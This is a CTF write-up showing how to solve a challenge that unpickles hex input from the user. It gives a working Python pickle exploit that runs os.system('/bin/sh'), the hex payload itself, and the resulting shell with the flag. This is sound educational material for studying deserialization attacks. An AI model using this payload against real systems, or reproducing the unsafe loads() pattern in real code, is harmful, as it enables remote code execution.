# revenge-is-best-served-pickled

## problem

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/eaab5a77-5ecc-404a-94b5-05ddc3edc07a)

```py
from pickle import loads

flag = "ictf{REDACTED}"
del flag

try:
    data = bytes.fromhex(input("Please give me the pickle data (in hex format): "))
    data = loads(data)
    print("I received:", data)
except:
    print("Failed to load pickle!")
```

## solution

for this we have to inject a pickle payload to allow us to use /bin/sh<br>
this is pretty simple, we can find an example on github [here](https://github.com/cyberheartmi9/python-pickle/blob/master/exploit.py)

```py
import pickle
import socket
import os

class pwn(object):
    def __reduce__(self):
       comm = "/bin/sh"
       return (os.system, (comm,))

pwn = pickle.dumps(pwn())
print(bytes.hex(pwn))
```

now, we have `80049522000000000000008c05706f736978948c0673797374656d9493948c072f62696e2f736894859452942e` as our payload

we can input this into the program and now have a remote shell.

running `ls` and then `cat run` gets the original program on the remote server, along with the flag:
```py
#!/usr/local/bin/python3.11
from pickle import loads

flag = "ictf{h0w_7h3_7urn_74b135}"
del flag

try:
    data = bytes.fromhex(input("Please give me the pickle data (in hex format): "))
    data = loads(data)
    print("I received:", data)
except:
    print("Failed to load pickle!")
```

the flag is `ictf{h0w_7h3_7urn_74b135}`
